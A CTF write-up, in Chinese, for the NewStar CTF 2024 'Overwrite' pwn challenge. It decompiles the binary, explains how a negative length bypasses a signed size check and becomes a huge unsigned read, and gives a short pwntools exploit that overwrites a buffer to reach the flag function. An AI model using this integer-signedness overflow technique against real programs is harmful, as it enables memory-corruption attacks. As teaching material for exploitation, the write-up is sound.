---
titleTemplate: ":title | WriteUp - NewStar CTF 2024"
---

# Overwrite

IDA 反编译查看源代码

```c
unsigned __int64 func()
{
  int nbytes; // [rsp+Ch] [rbp-84h] BYREF
  size_t nbytes_4; // [rsp+10h] [rbp-80h] BYREF
  char nptr[72]; // [rsp+40h] [rbp-50h] BYREF
  unsigned __int64 v4; // [rsp+88h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("pls input the length you want to readin: ");
  __isoc99_scanf("%d", &nbytes);
  if ( nbytes > 48 )
    exit(0);
  printf("pls input want you want to say: ");
  read(0, &nbytes_4, (unsigned int)nbytes);
  if ( atoi(nptr) <= 114514 )
  {
    puts("bad ,your wallet is empty");
  }
  else
  {
    puts("oh you have the money to get flag");
    getflag();
  }
  return v4 - __readfsqword(0x28u);
}
```

在这个函数中，我们可以输入一个数值 `nbytes`，然后读取相应长度的数据到 `nbytes_4` 中。如果 `nptr` 中的字符串被转换为数字且大于 `114514`，程序会打印 `flag`，否则会输出钱包空的信息。

漏洞分析：

1. `nptr` 和 `nbytes_4` 之间的偏移是 0x30。如果输入大于 0x30 的正整数，程序将会通过 `exit()` 退出。
2. 观察到，`read()` 函数中使用的是 `unsigned int nbytes`，但在输入校验时 `nbytes` 是 `int` 类型，进行了有符号比较。这里产生了漏洞。

```c
read(0, &nbytes_4, (unsigned int)nbytes);
```

例如，`-1` 的 16 进制表示是 `0xffffffff`，对于有符号整数来说，这是一个负数；但在无符号整数中，它代表一个非常大的正整数。因此，利用这一点，输入一个负数值，可以绕过前面的大小检查，将后续输入的数据覆盖到 `nptr`，从而完成利用。

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']
# p = process('./pwn')

p = remote('ip', port)
payload = b'a'*0x30 + b'114515'

p.sendlineafter(b': ', b'-1')


p.sendafter(b': ', payload)

p.interactive()
```
